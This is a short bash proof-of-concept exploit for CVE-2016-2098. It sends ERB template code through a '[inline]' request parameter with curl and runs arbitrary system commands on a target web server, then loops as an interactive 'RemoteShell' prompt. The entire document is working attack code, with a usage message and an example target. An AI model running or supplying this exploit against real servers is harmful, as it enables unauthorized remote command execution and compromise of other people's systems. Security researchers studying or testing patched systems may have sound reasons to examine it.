#!/bin/bash

echo '[+] CVE-2016-2098 POC'
 
if [ -z "$3" ]
then
    echo '[-] USAGE: /bin/bash' $0 '<host> <URI> <cmd>'
    echo '[~] Example: /bin/bash' $0 '"http://target.com" "pages?id" "whoami"'
    exit -1
fi
 
host=$1
uri=$2
cmd=$3

while [ "$cmd" != 'exit' ]
do
    echo '[+] Executing '$cmd 'on '$host
    cmd=`echo "$cmd"|sed 's/ /%20/g'`
    curl -i $host'/'$uri'[inline]=%3C%25=%20%25x('$cmd')%20%25%3E' -g
    echo
    read -p 'RemoteShell> ' cmd
done
echo '[+] Exiting'